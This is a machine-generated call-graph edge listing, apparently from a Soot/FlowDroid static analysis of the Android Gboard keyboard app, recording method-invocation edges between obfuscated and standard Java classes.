VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(12) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r3 = virtualinvoke $r30.<java.lang.StringBuilder: java.lang.String toString()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]: ") in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqo: lsa l()>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagFactory") in <hbu: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Error: void <init>()>() in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.Error: void <init>()>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Collection: java.lang.Object[] toArray()>() in <izw: java.lang.Object[] S(java.lang.Iterable)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
VIRTUAL edge: $r2 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.os.ParcelFileDescriptor openFile(android.net.Uri,java.lang.String)>(null, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.os.ParcelFileDescriptor openFile(android.net.Uri,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(15) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l4, $l5, $l3) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lsc: lsw a(java.util.logging.Level)>($r2) in <lsc: lsw d()> ==> <lsh: lsw a(java.util.logging.Level)>
VIRTUAL edge: virtualinvoke r0.<j$.util.concurrent.q: j$.util.concurrent.l c()>() in <j$.util.concurrent.d: java.lang.Object next()> ==> <j$.util.concurrent.q: j$.util.concurrent.l c()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(11) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<lma: lsa l()>() in <llg: void <init>(llo)> ==> <lqn: lsa l()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("ratelimit_count", class "Ljava/lang/Integer;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jlu: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean B(java.lang.String)>($r2) in <ivv: void f(java.lang.String)> ==> <ivw: boolean B(java.lang.String)>
VIRTUAL edge: $c1 = virtualinvoke $r1.<java.lang.String: char charAt(int)>(0) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lka: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: int[] copyOf(int[],int)>($r1, $i0) in <ljf: void l(int)> ==> <java.util.Arrays: int[] copyOf(int[],int)>
SPECIAL edge: $i0 = specialinvoke r0.<qj: int j()>() in <qj: int b(java.lang.Object)> ==> <qj: int j()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lsm: int a(lsz)> ==> <lta: boolean equals(java.lang.Object)>
CLINIT edge: staticinvoke <gwk: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <gwk: void <clinit>()>
VIRTUAL edge: $c2 = virtualinvoke $r0.<java.lang.String: char charAt(int)>($i0) in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: char charAt(int)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(18) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: $i2 = staticinvoke <lma: int e(int)>($i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: int e(int)>
INTERFACE edge: $z0 = interfaceinvoke $r3.<java.util.List: boolean isEmpty()>() in <ivv: ivw a()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String replace(char,char)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $i0 = staticinvoke <lma: int e(int)>($i0) in <lly: lma g()> ==> <lma: int e(int)>
STATIC edge: $r0 = staticinvoke <iye: lfa p(lfa)>($r1) in <hfd: void <clinit>()> ==> <iye: lfa p(lfa)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: boolean m()>
SPECIAL edge: specialinvoke $r13.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null throw statement replaced by Soot") in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: $r3 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r8, $i0) in <lvr: int a(java.util.Map$Entry,int,int,java.lang.Object[],int[])> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>()> ==> <lkf: void <init>()>
VIRTUAL edge: $r5 = virtualinvoke $r4.<qj: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r3) in <ivv: ivw i(java.lang.String)> ==> <qj: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <iec: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object k(int)>($i0) in <ljb: java.lang.Object getValue()> ==> <ljd: java.lang.Object k(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.p: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i5, $i1) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <jhe: void <init>(lak,lsr,int,byte[])> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <ltc: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ltc: void <clinit>()>
SPECIAL edge: specialinvoke r0.<lwe: void <init>()>() in <lwa: void <init>()> ==> <lwe: void <init>()>
STATIC edge: $i8 = staticinvoke <izw: int af(int,int)>($i2, $i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int af(int,int)>
STATIC edge: $i8 = staticinvoke <izw: int aj(java.lang.Object,int)>($r1, $i3) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.util.ArrayList: void <init>()>() in <ivv: void <init>()> ==> <java.util.ArrayList: void <init>()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String b()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String b()>
INTERFACE edge: $r1 = interfaceinvoke $r2.<java.util.Set: java.lang.Object[] toArray()>() in <ljf: java.lang.Object[] toArray()> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<qj: java.lang.Object get(java.lang.Object)>($r0) in <ivw: ivw g(java.lang.String)> ==> <qj: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
INTERFACE edge: $r1 = interfaceinvoke $r0.<java.util.Set: java.util.Iterator iterator()>() in <lri: int b(java.util.Set)> ==> <lqs: java.util.Iterator iterator()>
STATIC edge: $i1 = staticinvoke <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>($r2, $r1, 3) in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lwk: int c(java.lang.StackTraceElement[],java.lang.Class,int)>
SPECIAL edge: specialinvoke $r13.<lvq: void <init>(lvr,int)>(r0, $i1) in <lvr: void <init>(lvr,lvr)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i8 = staticinvoke <izw: int ac(int)>($i6) in <lma: lma i(int,java.lang.Object[])> ==> <izw: int ac(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Missing subtags to form a valid language tag") in <ivv: int h()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean z(java.lang.String)>($r4) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean z(java.lang.String)>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.ImeLatinApp: void <clinit>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: int hashCode()> ==> <ivw: java.lang.String p()>
CLINIT edge: staticinvoke <android.view.View: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.view.View: void <clinit>()>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.HashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r12 = virtualinvoke $r7.<lts: java.lang.Object e(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object e(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(1) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: $r3 = specialinvoke r0.<ljf: int[] r()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int[] r()>
SPECIAL edge: specialinvoke $r3.<lvr: void <init>(java.util.List)>($r0) in <lvt: void <clinit>()> ==> <lvr: void <init>(java.util.List)>
STATIC edge: $z0 = staticinvoke <ivw: boolean F(java.lang.String)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <ivw: boolean F(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <iej: void <clinit>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $z0 = staticinvoke <ivw: boolean v(java.lang.String)>($r0) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean v(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<java.lang.StringBuilder: void <init>()>() in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: void clear()>() in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: void clear()>
STATIC edge: staticinvoke <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)>
STATIC edge: $z0 = staticinvoke <java.lang.reflect.Modifier: boolean isStatic(int)>($i2) in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.reflect.Modifier: boolean isStatic(int)>
STATIC edge: $l2 = staticinvoke <j$.util.concurrent.ThreadLocalRandom: long e(long)>($l2) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <j$.util.concurrent.ThreadLocalRandom: long e(long)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <ljf: java.lang.Object[] toArray()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $r26 = virtualinvoke $r25.<java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>("addSuppressed", $r24) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.reflect.Method getDeclaredMethod(java.lang.String,java.lang.Class[])>
SPECIAL edge: specialinvoke $r1.<java.lang.StringBuilder: void <init>()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lta: int hashCode()>
STATIC edge: $r5 = staticinvoke <lma: lma i(int,java.lang.Object[])>(5, $r4) in <lma: lma v(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)> ==> <lma: lma i(int,java.lang.Object[])>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(double[],double[])>($r16, $r17) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(double[],double[])>
VIRTUAL edge: $r12 = virtualinvoke $r11.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r1) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r5.<j$.util.concurrent.p: void <init>()>() in <j$.util.concurrent.q: j$.util.concurrent.l c()> ==> <j$.util.concurrent.p: void <init>()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<java.lang.String: char[] toCharArray()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: char[] toCharArray()>
STATIC edge: $r4 = staticinvoke <lma: lma r(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lsg: void <init>()>() in <lsh: void <clinit>()> ==> <lsg: void <init>()>
SPECIAL edge: specialinvoke $r12.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_IMAGE", 12, 12) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke r0.<lsv: void <init>()>() in <lte: void <init>()> ==> <lsv: void <init>()>
STATIC edge: $r4 = staticinvoke <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>($r0, $i0, $i1, 0) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <lqq: java.lang.Object u(java.lang.Object[],int,int,int)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "log site key") in <lta: void <init>(lsr,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
STATIC edge: $z0 = staticinvoke <ojg: boolean f(java.lang.Object,java.lang.Object)>($r1, $r4) in <qj: int i(java.lang.Object,int)> ==> <ojg: boolean f(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <ivv: void <init>()> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getValue()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getValue()>
STATIC edge: $r12 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r24.<lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>($r21, $r6, $r22) in <lsd: boolean b(lsr)> ==> <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: androidx.lifecycle.ProcessLifecycleOwnerInitializer dummyMainMethod_androidx_lifecycle_ProcessLifecycleOwnerInitializer(android.content.Intent)>
SPECIAL edge: specialinvoke $r1.<lfb: void <init>(lfa)>($r0) in <iye: lfa p(lfa)> ==> <lfb: void <init>(lfa)>
SPECIAL edge: specialinvoke $r6.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw a()> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r2.<hns: void <init>()>() in <hnt: void <clinit>()> ==> <hns: void <init>()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Enum: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: int ordinal()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r0) in <ivw: ivw g(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<java.lang.RuntimeException: void <init>()>() in <java.lang.NullPointerException: void <init>(java.lang.String)> ==> <java.lang.RuntimeException: void <init>()>
INTERFACE edge: $r6 = interfaceinvoke $r9.<java.util.Map$Entry: java.lang.Object getKey()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.k: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(5) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lma: lkq f()>() in <lma: lkq k()> ==> <lqn: lkq f()>
SPECIAL edge: specialinvoke r0.<lim: void <init>()>() in <llo: void <init>(lkx,int)> ==> <lim: void <init>()>
STATIC edge: $r8 = staticinvoke <ivw: ivw d(java.util.Locale)>($r9) in <ivw: void <clinit>()> ==> <ivw: ivw d(java.util.Locale)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <j$.util.concurrent.ConcurrentHashMap: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <ojg: boolean f(java.lang.Object,java.lang.Object)> ==> <ivw: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean w(char[],int,int)>($r4, $i4, $i5) in <nzh: boolean f(ivv)> ==> <ivw: boolean w(char[],int,int)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.Map$Entry: java.lang.Object getKey()>() in <llg: java.lang.Object next()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke r0.<qj: void <init>(int)>(0) in <qj: void <init>()> ==> <qj: void <init>(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: int n(int)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r1.<mag: void <init>(java.lang.String,int,int)>("STICKER_JSON", 1, 1) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean isEmpty()>() in <ivv: ivw i(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("Unrecognized language tag") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("ExpressiveStickerMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $r3 = virtualinvoke $r4.<ltc: java.lang.String toString()>() in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Enum: java.lang.String toString()>
VIRTUAL edge: $r6 = virtualinvoke $r7.<lsq: java.lang.String d()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: java.lang.String d()>
SPECIAL edge: specialinvoke $r0.<java.util.concurrent.atomic.AtomicReference: void <init>()>() in <bel: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicReference: void <init>()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.AssertionError: void <init>(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lql: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
INTERFACE edge: $r8 = interfaceinvoke $r7.<java.util.Set: java.util.Iterator iterator()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.e: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwc: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r3.<java.lang.String: java.lang.String concat(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i2, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r2.<mag: void <init>(java.lang.String,int,int)>("GIS_GIF_METADATA", 2, 2) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r28 = staticinvoke <java.lang.Long: java.lang.Long valueOf(java.lang.String)>($r12) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Long: java.lang.Long valueOf(java.lang.String)>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "sizeCtl") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $i3 = staticinvoke <izw: int ad(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ad(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r6) in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("rnd", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: $i1 = virtualinvoke r0.<lkq: int size()>() in <lkq: lsb C(int)> ==> <lqp: int size()>
VIRTUAL edge: $i4 = virtualinvoke r0.<ljd: int e()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int e()>
